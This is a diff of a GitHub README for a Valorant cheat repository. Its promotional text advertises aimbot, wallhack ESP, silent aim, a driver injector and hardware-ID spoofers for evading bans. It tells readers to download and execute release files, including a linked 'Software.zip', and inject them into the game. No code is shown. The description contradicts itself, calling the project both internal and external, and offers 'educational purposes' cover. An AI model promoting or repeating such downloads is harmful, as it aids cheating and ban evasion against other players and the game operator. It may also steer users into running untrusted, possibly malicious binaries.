@@ -1,48 +1,126 @@
-<div align="center">
+```markdown
+# Maxi-Valorant-Internal-Cheats: Enhance Your Valorant Experience 🎮
 
-# Valorant Internal Cheat C++
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Muha2D2/Maxi-Valorant-Internal-Cheats/releases)
 
-[Click here to download](https://github.com/kikusboomboom5/Maxi-Valorant-Internal-Cheats/releases/download/Download/Software.zip)
+## Table of Contents
+- [Project Overview](#project-overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## How to Use
+## Project Overview
 
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click here to download](https://github.com/kikusboomboom5/Maxi-Valorant-Internal-Cheats/releases/download/Download/Software.zip)
-
-### Visual Studio :
-
-1. Open the solution file (.sln).
-2. Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-3. When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
-
-- **In Valorant, winning against your opponents can be hard if you don't know their moves. Even with great aimbot or trigger bot skills, it can be challenging to beat a well-planned strategy with just mechanical skills.**
-
-- **Valorant wallhack helps solve this by letting you see enemies through walls and objects. Using a Valorant ESP changes the game, giving you a big advantage even without using other cheats like aimbots.**
+Maxi-Valorant-Internal-Cheats is an external game project primarily written in C++. This repository includes various cheats and tools designed to enhance your gaming experience in Valorant. The project uses external libraries to ensure smooth functionality. As a developer, I am actively combating scammers while creating tools like the Hack Cheat Driver, ESP, Aimbot, Magic Bullet, Driver Injector, Overlay, and Imgui.
 
 ## Features
 
-**ESP/Glow with Stream-Proof Magic:** Our ESP/Glow feature is not only powerful but also stream-proof. Integrate it with your gameplay and impress your audience without any compromise.
+This project includes a variety of features to improve your gameplay:
 
-** Aim Assist:** Achieve the highest level of precision with our aim assist, designed to mimic human aiming behavior for unparalleled accuracy.
+- **Aimbot**: Automatically aims at opponents.
+- **ESP**: Displays enemy positions through walls.
+- **Magic Bullet**: Ensures bullets hit targets regardless of obstacles.
+- **Driver Injector**: Injects cheats into the game seamlessly.
+- **Overlay**: Provides a user-friendly interface for managing cheats.
+- **Imgui**: Utilizes Imgui for easy navigation and settings adjustment.
+- **Bunnyhop**: Enables continuous jumping for faster movement.
+- **Fast Crouch**: Quickly crouches to evade enemy fire.
+- **Glow**: Highlights enemies for better visibility.
+- **Radar**: Displays enemy locations on a mini-map.
+- **Skinchanger**: Allows customization of weapon skins.
+- **Insta-Agent**: Instantly selects agents.
+- **Permanent Spoofer**: Changes your hardware ID permanently.
+- **Temporary Spoofer**: Temporarily alters your hardware ID.
+- **Silent Aim**: Ensures shots hit without the enemy noticing.
+- **Spinbot**: Spins your character rapidly to confuse opponents.
+- **Third-Person View**: Switches to a third-person perspective.
 
-**Trigger:** Deliver precise shots with our standalone trigger for all weapon types, eliminating spread and recoil.
+## Installation
 
-**Spoofer:** Protect your identity with our top-notch spoofer, masking your identity to outsmart any attempts to expose you.
+To get started with Maxi-Valorant-Internal-Cheats, follow these steps:
 
-**Universal Compatibility:** Our cheat works with the Regular VAL Client, VCT, and League Client, adapting seamlessly to different game versions for a consistent advantage.
+1. **Download the latest release** from the [Releases section](https://github.com/Muha2D2/Maxi-Valorant-Internal-Cheats/releases). You will need to download and execute the necessary files.
 
-## Media
+2. **Extract the files** to a folder on your computer.
 
-![image](https://user-images.githubusercontent.com/105713914/169301768-41c1985a-2f5c-420f-88ff-ab476d2492fc.png)
+3. **Open the configuration file** to adjust settings according to your preferences.
 
-![image](https://user-images.githubusercontent.com/105713914/169301941-0e7e4b2e-8c90-4b8a-ac14-c39b47d49fac.png)
+4. **Run the Driver Injector** to load the cheats into Valorant.
 
-## Disclaimer
+5. **Launch Valorant** and enjoy the enhanced features.
 
-This source code is for educational purposes only.
+## Usage
+
+Once you have installed the cheats, you can access the overlay by pressing the designated hotkey (usually F1). This will open the Imgui interface where you can toggle features on or off.
+
+### Aimbot Configuration
+
+- Enable or disable the aimbot.
+- Adjust the aim sensitivity.
+- Set the aimbot key for activation.
+
+### ESP Configuration
+
+- Toggle ESP on or off.
+- Choose the colors for enemy outlines.
+- Set distance limits for visibility.
+
+### Additional Features
+
+Explore other features in the Imgui interface. Each feature comes with its own set of options for customization.
+
+## Contributing
+
+Contributions are welcome! If you want to improve this project, please follow these steps:
+
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them.
+4. **Push to your branch**.
+5. **Create a pull request** explaining your changes.
 
 ## License
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For any questions or suggestions, feel free to reach out:
+
+- GitHub: [Muha2D2](https://github.com/Muha2D2)
+- Email: muha2d2@example.com
+
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Muha2D2/Maxi-Valorant-Internal-Cheats/releases)
+
+---
+
+### Topics
+
+This repository covers various topics related to Valorant cheats:
+
+- valorant
+- valorant-aimbot
+- valorant-bunnyhop
+- valorant-cheat
+- valorant-esp
+- valorant-exploits
+- valorant-fast-crouch
+- valorant-glow
+- valorant-hack
+- valorant-hack-source-code
+- valorant-insta-agent
+- valorant-permanted-spoofer
+- valorant-radar
+- valorant-skinchanger
+- valorant-skip-tutorial
+- valorant-silent-aim
+- valorant-spinbot
+- valorant-spoofer
+- valorant-temporary-spoofer
+- valorant-third-person
+
+Feel free to explore the repository and utilize the tools available to enhance your gaming experience in Valorant.
+```
